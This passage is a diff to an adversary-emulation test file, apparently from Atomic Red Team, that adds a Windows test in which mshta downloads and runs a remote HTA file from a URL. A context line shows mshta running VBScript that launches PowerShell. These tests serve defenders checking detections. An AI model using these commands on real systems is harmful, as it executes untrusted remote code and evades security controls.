@@ -52,3 +52,19 @@ atomic_tests:
     name: command_prompt
     command: |
       mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+- name: Mshta Executes Remote HTML Application (HTA)
+  description: |
+    Execute an arbitrary remote HTA.
+
+  supported_platforms:
+    - windows
+  input_arguments:
+    hta_url:
+      description: URL to HTA file for execution
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+  executor:
+    name: command_prompt
+    command: |
+      mshta #{hta_url}
